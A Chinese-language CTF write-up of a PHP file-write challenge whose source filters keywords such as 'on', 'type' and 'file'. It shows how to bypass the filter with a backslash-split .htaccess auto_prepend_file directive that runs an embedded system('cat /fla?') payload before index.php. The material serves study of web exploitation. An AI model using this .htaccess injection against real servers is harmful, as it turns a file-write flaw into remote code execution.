```php

<?php 
    $files = scandir('./');  
    foreach($files as $file) { 
        if(is_file($file)){ 
            if ($file !== "index.php") { 
                unlink($file); 
            } 
        } 
    } 
    if(!isset($_GET['content']) || !isset($_GET['filename'])) { 
        highlight_file(__FILE__); 
        die(); 
    } 
    $content = $_GET['content']; 
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) { 
        echo "Hacker"; 
        die(); 
    } 
    $filename = $_GET['filename']; 
    if(preg_match("/[^a-z\.]/", $filename) == 1) { 
        echo "Hacker"; 
        die(); 
    } 
    $files = scandir('./');  
    foreach($files as $file) { 
        if(is_file($file)){ 
            if ($file !== "index.php") { 
                unlink($file); 
            } 
        } 
    } 
    file_put_contents($filename, $content . "\nHello, world"); 
```

扫描当前目录下的文件，删掉了除`index.php`的其他文件

GET获取两个请求参数
`content`：不能含有on、html、type、flag、upload、file
`filename`：只能由字母和`.`组成

尝试上传木马 `?filename=test.php&content=<?php phpinfo();?>`

但访问test.php发现是以文本的形式返回，并没有当成php执行。

猜测服务器设置了只解析index.php为php文件

这时候就引导我们上传`.htaccess`文件了，可以指定执行php的后缀

**需要在服务器的主配置文件将 AllowOverride 设置为 All**

> AddType application/x-httpd-php .htm          #.htm文件也可以被当成php文件执行

先抛下过滤不说，就算我们上传上去了，再次利用index.php来写木马文件时，我们之前上传的`.htaccess`就会被删掉

有没有一种办法在`.htaccess`中写木马，并在index.php执行之前先执行`.htaccess`呢？
可以利用`auto_prepend_file`

> `php_value auto_prepend_file xxx`： 在主文件解析之前自动解析包含xxx的内容
>
> htaccess 中有 # 单行注释符, 且支持 \拼接上下两行

那下面就好理解了，由于过滤了`file`，使用`\`来绕过
在主文件解析之前自动解析包含`.htaccess`自身的内容

为了防止`.htaccess`本身格式出错，需要将我们的恶意代码注释掉(`#`)
`file_put_contents`时还在末尾拼接了`\nHello, world`，这部分也需要注释掉，也是使用`\`连接符连接两行

> php_value auto_prepend_fil\
> e .htaccess
> #<?php system('cat /fla?');?>\

再次访问`/index.php`，得到flag